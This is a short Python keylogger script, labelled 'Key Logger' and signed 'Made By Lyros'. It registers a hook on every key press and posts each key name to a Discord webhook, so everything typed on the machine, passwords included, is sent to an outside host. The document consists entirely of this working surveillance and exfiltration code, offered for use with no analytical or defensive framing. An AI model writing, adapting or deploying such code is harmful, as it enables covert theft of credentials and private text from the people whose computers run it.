import keyboard
import requests

# Set up the Discord webhook URL
DISCORD_WEBHOOK_URL = 'your_webhook_url'

print('Key Logger - Started')

# Set up the logging function
def log_keystroke(event):
    data = {
        'content': f"```\nPressed {event.name} **Made By Lyros**\n```"
    }
    requests.post(DISCORD_WEBHOOK_URL, data=data)

# Start logging keystrokes
keyboard.on_press(log_keystroke)

# Keep the program running
keyboard.wait()